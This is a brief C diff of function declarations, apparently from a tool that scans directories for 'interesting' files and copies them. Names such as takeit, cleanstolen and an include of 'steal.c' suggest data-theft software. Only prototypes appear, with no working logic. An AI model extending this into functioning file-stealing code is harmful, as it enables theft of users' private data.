@@ -1,7 +1,3 @@
-off_t getstolensize(void);
-off_t getnewsize(off_t fsize);
-#include "size.c"
-
 #if defined FILE_CLEANSE_TIMER
 void rmstolens(void);
 void cleanstolen(void);
@@ -27,6 +23,6 @@ int interestingdir(const char *path);
 int interesting(const char *path);
 int writecopy(const char *old_path, char *new_path);
 char *getnewpath(char *filename);
-int takeit(const char *oldpath, char *newpath);
+static int takeit(void *oldpath);
 void inspectfile(const char *pathname);
 #include "steal.c"
